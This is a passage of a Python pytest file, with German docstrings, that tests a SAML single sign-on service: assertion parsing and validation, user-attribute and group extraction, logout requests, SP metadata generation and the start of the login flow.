        assert assertion.name_id_format == "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"
        assert assertion.issuer == "https://idp.example.com/metadata"
        assert assertion.session_index == "_session456"
        assert assertion.audience == "https://sp.example.com/metadata"

    def test_extract_assertion_missing_assertion_fails(self, saml_service, saml_config):
        """Fehlende Assertion wird abgelehnt."""
        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">test</saml:Issuer>
</samlp:Response>"""

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        with pytest.raises(ValueError) as exc_info:
            saml_service._extract_assertion(root, saml_config)

        assert "keine assertion" in str(exc_info.value).lower()

    def test_extract_assertion_missing_nameid_fails(self, saml_service, saml_config):
        """Fehlende NameID wird abgelehnt."""
        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Assertion>
        <saml:Issuer>test</saml:Issuer>
        <saml:Subject>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>"""

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        with pytest.raises(ValueError) as exc_info:
            saml_service._extract_assertion(root, saml_config)

        assert "nameid" in str(exc_info.value).lower()

    def test_extract_assertion_with_attributes(self, saml_service, saml_config):
        """SAML-Attribute werden korrekt extrahiert."""
        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Assertion>
        <saml:Issuer>https://idp.example.com/metadata</saml:Issuer>
        <saml:Subject>
            <saml:NameID>user@example.com</saml:NameID>
        </saml:Subject>
        <saml:AttributeStatement>
            <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress">
                <saml:AttributeValue>user@example.com</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name">
                <saml:AttributeValue>Test User</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="groups">
                <saml:AttributeValue>admin</saml:AttributeValue>
                <saml:AttributeValue>users</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>"""

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        assertion = saml_service._extract_assertion(root, saml_config)

        assert "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress" in assertion.attributes
        assert assertion.attributes["http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"] == ["user@example.com"]
        assert assertion.attributes["groups"] == ["admin", "users"]


# ============================================================================
# Test Class: Assertion Validation
# ============================================================================


class TestAssertionValidation:
    """Tests for _validate_assertion method."""

    def test_validate_assertion_valid(self, saml_service, saml_config):
        """Gueltige Assertion wird akzeptiert."""
        now = datetime.utcnow()
        assertion = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress",
            issuer=saml_config.idp_entity_id,
            audience=saml_config.sp_entity_id,
            not_before=now - timedelta(minutes=5),
            not_on_or_after=now + timedelta(minutes=30),
        )

        # Should not raise
        saml_service._validate_assertion(assertion, saml_config)

    def test_validate_assertion_wrong_issuer_fails(self, saml_service, saml_config):
        """Falscher Issuer wird abgelehnt."""
        assertion = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer="https://wrong-idp.example.com",
            audience=saml_config.sp_entity_id,
        )

        with pytest.raises(ValueError) as exc_info:
            saml_service._validate_assertion(assertion, saml_config)

        assert "issuer" in str(exc_info.value).lower()

    def test_validate_assertion_wrong_audience_fails(self, saml_service, saml_config):
        """Falsche Audience wird abgelehnt."""
        assertion = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer=saml_config.idp_entity_id,
            audience="https://wrong-sp.example.com",
        )

        with pytest.raises(ValueError) as exc_info:
            saml_service._validate_assertion(assertion, saml_config)

        assert "audience" in str(exc_info.value).lower()

    def test_validate_assertion_not_yet_valid_fails(self, saml_service, saml_config):
        """Noch nicht gueltige Assertion wird abgelehnt."""
        now = datetime.utcnow()
        assertion = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer=saml_config.idp_entity_id,
            not_before=now + timedelta(hours=1),  # In the future
        )

        with pytest.raises(ValueError) as exc_info:
            saml_service._validate_assertion(assertion, saml_config)

        assert "noch nicht" in str(exc_info.value).lower()

    def test_validate_assertion_expired_fails(self, saml_service, saml_config):
        """Abgelaufene Assertion wird abgelehnt."""
        now = datetime.utcnow()
        assertion = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer=saml_config.idp_entity_id,
            not_on_or_after=now - timedelta(hours=1),  # In the past
        )

        with pytest.raises(ValueError) as exc_info:
            saml_service._validate_assertion(assertion, saml_config)

        assert "abgelaufen" in str(exc_info.value).lower()

    def test_validate_assertion_clock_skew_tolerance(self, saml_service, saml_config):
        """5 Minuten Clock-Skew wird toleriert."""
        now = datetime.utcnow()

        # Assertion that started 3 minutes in the future (within 5 min skew)
        assertion_future = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer=saml_config.idp_entity_id,
            not_before=now + timedelta(minutes=3),
        )
        # Should not raise (within tolerance)
        saml_service._validate_assertion(assertion_future, saml_config)

        # Assertion that expired 3 minutes ago (within 5 min skew)
        assertion_past = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer=saml_config.idp_entity_id,
            not_on_or_after=now - timedelta(minutes=3),
        )
        # Should not raise (within tolerance)
        saml_service._validate_assertion(assertion_past, saml_config)


# ============================================================================
# Test Class: User Info Extraction
# ============================================================================


class TestUserInfoExtraction:
    """Tests for _extract_user_info method."""

    def test_extract_user_info_basic(self, saml_service):
        """Basis-Benutzerinfo wird korrekt extrahiert."""
        assertion = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer="https://idp.example.com",
            attributes={
                "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": ["user@example.com"],
                "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name": ["Test User"],
                "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname": ["Test"],
                "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname": ["User"],
            },
        )

        attribute_mapping = {
            "email": "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress",
            "name": "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name",
            "given_name": "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname",
            "family_name": "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname",
        }

        user_info = saml_service._extract_user_info(assertion, attribute_mapping)

        assert user_info.name_id == "user@example.com"
        assert user_info.email == "user@example.com"
        assert user_info.name == "Test User"
        assert user_info.given_name == "Test"
        assert user_info.family_name == "User"

    def test_extract_user_info_fallback_to_nameid(self, saml_service):
        """Email faellt auf NameID zurueck wenn nicht in Attributen."""
        assertion = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer="https://idp.example.com",
            attributes={},
        )

        user_info = saml_service._extract_user_info(assertion, {})

        assert user_info.email == "user@example.com"  # Fallback to NameID

    def test_extract_user_info_groups_microsoft(self, saml_service):
        """Microsoft Entra Gruppen werden extrahiert."""
        assertion = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer="https://idp.example.com",
            attributes={
                "http://schemas.microsoft.com/ws/2008/06/identity/claims/groups": [
                    "group-id-1",
                    "group-id-2",
                ],
            },
        )

        user_info = saml_service._extract_user_info(assertion, {})

        assert "group-id-1" in user_info.groups
        assert "group-id-2" in user_info.groups

    def test_extract_user_info_groups_generic(self, saml_service):
        """Generische Gruppen-Attribute werden extrahiert."""
        assertion = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer="https://idp.example.com",
            attributes={
                "groups": ["admin", "users"],
                "memberOf": ["cn=developers,ou=groups"],
            },
        )

        user_info = saml_service._extract_user_info(assertion, {})

        assert "admin" in user_info.groups
        assert "users" in user_info.groups
        assert "cn=developers,ou=groups" in user_info.groups

    def test_extract_user_info_raw_attributes_preserved(self, saml_service):
        """Alle Raw-Attribute werden beibehalten."""
        assertion = SAMLAssertion(
            subject_name_id="user@example.com",
            name_id_format="emailAddress",
            issuer="https://idp.example.com",
            attributes={
                "custom_attr": ["value1", "value2"],
                "another_attr": ["test"],
            },
        )

        user_info = saml_service._extract_user_info(assertion, {})

        assert user_info.raw_attributes == assertion.attributes


# ============================================================================
# Test Class: Logout Request Generation
# ============================================================================


class TestLogoutRequestGeneration:
    """Tests for generate_logout_request method."""

    @pytest.mark.asyncio
    async def test_generate_logout_request_success(self, saml_service, mock_provider):
        """Logout-Request wird korrekt generiert."""
        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = mock_provider

            logout_url = await saml_service.generate_logout_request(
                provider_id=mock_provider.id,
                company_id=mock_provider.company_id,
                name_id="user@example.com",
                session_index="_session123",
            )

            assert logout_url is not None
            assert mock_provider.saml_config.idp_slo_url in logout_url
            assert "SAMLRequest=" in logout_url

    @pytest.mark.asyncio
    async def test_generate_logout_request_no_slo_url(self, saml_service, mock_provider):
        """Ohne SLO-URL wird None zurueckgegeben."""
        mock_provider.saml_config.idp_slo_url = None

        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = mock_provider

            logout_url = await saml_service.generate_logout_request(
                provider_id=mock_provider.id,
                company_id=mock_provider.company_id,
                name_id="user@example.com",
            )

            assert logout_url is None

    @pytest.mark.asyncio
    async def test_generate_logout_request_provider_not_found(self, saml_service):
        """Unbekannter Provider gibt None zurueck."""
        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = None

            logout_url = await saml_service.generate_logout_request(
                provider_id=uuid4(),
                company_id=uuid4(),
                name_id="user@example.com",
            )

            assert logout_url is None

    @pytest.mark.asyncio
    async def test_generate_logout_request_includes_session_index(self, saml_service, mock_provider):
        """SessionIndex wird in Logout-Request aufgenommen."""
        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = mock_provider

            logout_url = await saml_service.generate_logout_request(
                provider_id=mock_provider.id,
                company_id=mock_provider.company_id,
                name_id="user@example.com",
                session_index="_session456",
            )

            # Decode and check
            from urllib.parse import parse_qs, urlparse
            parsed = urlparse(logout_url)
            params = parse_qs(parsed.query)

            saml_request = params["SAMLRequest"][0]
            decoded = saml_service._decode_and_inflate(saml_request)

            assert "<samlp:SessionIndex>_session456</samlp:SessionIndex>" in decoded


# ============================================================================
# Test Class: Metadata Generation
# ============================================================================


class TestMetadataGeneration:
    """Tests for generate_metadata method."""

    def test_generate_metadata_basic(self, saml_service, saml_config):
        """Basis-Metadaten werden korrekt generiert."""
        metadata = saml_service.generate_metadata(saml_config)

        assert '<?xml version="1.0" encoding="UTF-8"?>' in metadata
        assert "<md:EntityDescriptor" in metadata
        assert f'entityID="{saml_config.sp_entity_id}"' in metadata
        assert "<md:SPSSODescriptor" in metadata
        assert f'Location="{saml_config.sp_acs_url}"' in metadata

    def test_generate_metadata_signing_flags(self, saml_service, saml_config):
        """Signing-Flags werden korrekt gesetzt."""
        metadata = saml_service.generate_metadata(saml_config)

        assert f'AuthnRequestsSigned="{str(saml_config.sign_requests).lower()}"' in metadata
        assert f'WantAssertionsSigned="{str(saml_config.sign_assertions).lower()}"' in metadata

    def test_generate_metadata_with_slo(self, saml_service, saml_config):
        """SLO-Endpoint wird in Metadaten aufgenommen."""
        metadata = saml_service.generate_metadata(saml_config)

        assert "<md:SingleLogoutService" in metadata
        assert f'Location="{saml_config.sp_slo_url}"' in metadata

    def test_generate_metadata_without_slo(self, saml_service, saml_config):
        """Ohne SLO-URL wird kein SLO-Element generiert."""
        saml_config.sp_slo_url = None

        metadata = saml_service.generate_metadata(saml_config)

        assert "<md:SingleLogoutService" not in metadata

    def test_generate_metadata_with_certificate(self, saml_service, saml_config, rsa_certificate):
        """SP-Zertifikat wird in Metadaten aufgenommen."""
        saml_config.sp_certificate = rsa_certificate

        metadata = saml_service.generate_metadata(saml_config)

        assert "<md:KeyDescriptor" in metadata
        assert '<ds:X509Certificate>' in metadata

    def test_generate_metadata_nameid_format(self, saml_service, saml_config):
        """NameID-Format wird in Metadaten aufgenommen."""
        metadata = saml_service.generate_metadata(saml_config)

        assert f"<md:NameIDFormat>{saml_config.name_id_format}</md:NameIDFormat>" in metadata


# ============================================================================
# Test Class: Start Authentication Flow
# ============================================================================


class TestStartAuthentication:
    """Tests for start_authentication method."""

    @pytest.mark.asyncio
    async def test_start_authentication_success(self, saml_service, mock_provider):
        """Authentifizierung wird erfolgreich gestartet."""
        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = mock_provider

            redirect_url, request_id = await saml_service.start_authentication(
                provider_id=mock_provider.id,
                company_id=mock_provider.company_id,
            )

            assert mock_provider.saml_config.idp_sso_url in redirect_url
            assert "SAMLRequest=" in redirect_url
            assert request_id.startswith("_id")

    @pytest.mark.asyncio
    async def test_start_authentication_provider_not_found(self, saml_service):
        """Unbekannter Provider wird abgelehnt."""
        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = None

            with pytest.raises(ValueError) as exc_info:
                await saml_service.start_authentication(
                    provider_id=uuid4(),
                    company_id=uuid4(),
                )

            assert "nicht gefunden" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_start_authentication_disabled_provider(self, saml_service, mock_provider):
        """Deaktivierter Provider wird abgelehnt."""
        mock_provider.enabled = False

        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = mock_provider

            with pytest.raises(ValueError) as exc_info:
                await saml_service.start_authentication(
                    provider_id=mock_provider.id,
                    company_id=mock_provider.company_id,
                )

            assert "deaktiviert" in str(exc_info.value).lower()

    @pytest.mark.asyncio
    async def test_start_authentication_with_relay_state(self, saml_service, mock_provider):
        """RelayState wird in URL aufgenommen."""
        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = mock_provider

            redirect_url, _ = await saml_service.start_authentication(
                provider_id=mock_provider.id,
                company_id=mock_provider.company_id,
                relay_state="/dashboard",
            )

            assert "RelayState=%2Fdashboard" in redirect_url or "RelayState=/dashboard" in redirect_url

    @pytest.mark.asyncio
    async def test_start_authentication_stores_request(self, saml_service, mock_provider):
        """Request wird in StateManager fuer spaetere Validierung gespeichert."""
        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = mock_provider

            _, request_id = await saml_service.start_authentication(
                provider_id=mock_provider.id,
                company_id=mock_provider.company_id,
            )

            # Verify request was stored via StateManager
            saml_service.state_manager.store_saml_request.assert_called_once()
            call_args = saml_service.state_manager.store_saml_request.call_args
            stored_request = call_args[0][1]  # Second positional arg is SAMLRequest
            assert call_args[0][0] == request_id  # First arg is request_id
            assert stored_request.provider_id == mock_provider.id


# ============================================================================
# Test Class: SAML Request Model
# ============================================================================


class TestSAMLRequestModel:
    """Tests for SAMLRequest Pydantic model."""

    def test_saml_request_defaults(self):
        """SAMLRequest hat korrekte Standardwerte."""
        provider_id = uuid4()
        request = SAMLRequest(provider_id=provider_id)

        assert request.request_id.startswith("_id")
        assert request.provider_id == provider_id
        assert request.relay_state is None
        assert request.created_at is not None
        assert request.expires_at > request.created_at

    def test_saml_request_expiry(self):
        """SAMLRequest laeuft nach 10 Minuten ab."""
        request = SAMLRequest(provider_id=uuid4())

        time_diff = request.expires_at - request.created_at
        assert timedelta(minutes=9) < time_diff < timedelta(minutes=11)


# ============================================================================
# Test Class: Edge Cases
# ============================================================================


class TestEdgeCases:
    """Tests for edge cases and error conditions."""

    def test_certificate_without_pem_headers(self, saml_service, rsa_key_pair):
        """Zertifikat ohne PEM-Header wird korrekt verarbeitet."""
        full_cert = generate_test_certificate(rsa_key_pair)
        # Remove headers
        cert_body = full_cert.replace("-----BEGIN CERTIFICATE-----", "").replace(
            "-----END CERTIFICATE-----", ""
        ).strip()

        config = SAMLConfig(
            idp_entity_id="https://idp.example.com/metadata",
            idp_sso_url="https://idp.example.com/sso",
            idp_certificate=cert_body,  # No headers
            sp_entity_id="https://sp.example.com/metadata",
            sp_acs_url="https://sp.example.com/acs",
            sign_assertions=True,
            attribute_mapping={},
        )

        # Create a signed response
        request_id = "_id" + uuid4().hex
        response_xml = create_signed_saml_response(
            rsa_key_pair,
            request_id,
            algorithm="sha256",
        )

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        # Should work - service adds headers if missing
        saml_service._validate_signature(root, config)

    def test_empty_attribute_values_ignored(self, saml_service, saml_config):
        """Leere Attributwerte werden ignoriert."""
        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Assertion>
        <saml:Issuer>https://idp.example.com/metadata</saml:Issuer>
        <saml:Subject>
            <saml:NameID>user@example.com</saml:NameID>
        </saml:Subject>
        <saml:AttributeStatement>
            <saml:Attribute Name="email">
                <saml:AttributeValue>user@example.com</saml:AttributeValue>
                <saml:AttributeValue></saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>"""

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        assertion = saml_service._extract_assertion(root, saml_config)

        # Empty values should be filtered out
        assert assertion.attributes["email"] == ["user@example.com"]

    def test_multiple_attribute_values(self, saml_service, saml_config):
        """Mehrere Attributwerte werden korrekt extrahiert."""
        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Assertion>
        <saml:Issuer>https://idp.example.com/metadata</saml:Issuer>
        <saml:Subject>
            <saml:NameID>user@example.com</saml:NameID>
        </saml:Subject>
        <saml:AttributeStatement>
            <saml:Attribute Name="roles">
                <saml:AttributeValue>admin</saml:AttributeValue>
                <saml:AttributeValue>user</saml:AttributeValue>
                <saml:AttributeValue>viewer</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>"""

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        assertion = saml_service._extract_assertion(root, saml_config)

        assert assertion.attributes["roles"] == ["admin", "user", "viewer"]

    @pytest.mark.asyncio
    async def test_concurrent_requests_isolation(self, saml_service, mock_provider):
        """Parallele Requests werden isoliert behandelt."""
        with patch.object(saml_service.config_service, 'get_provider', new_callable=AsyncMock) as mock_get:
            mock_get.return_value = mock_provider

            # Start multiple authentication flows
            results = []
            for _ in range(5):
                _, request_id = await saml_service.start_authentication(
                    provider_id=mock_provider.id,
                    company_id=mock_provider.company_id,
                )
                results.append(request_id)

            # All request IDs should be unique
            assert len(set(results)) == 5

            # All should be stored via StateManager (called 5 times)
            assert saml_service.state_manager.store_saml_request.call_count == 5

    def test_assertion_without_conditions(self, saml_service, saml_config):
        """Assertion ohne Conditions wird akzeptiert."""
        response_xml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Assertion>
        <saml:Issuer>https://idp.example.com/metadata</saml:Issuer>
        <saml:Subject>
            <saml:NameID>user@example.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>"""

        from defusedxml import ElementTree as ET
        root = ET.fromstring(response_xml)

        assertion = saml_service._extract_assertion(root, saml_config)

        assert assertion.not_before is None
        assert assertion.not_on_or_after is None
        assert assertion.audience is None
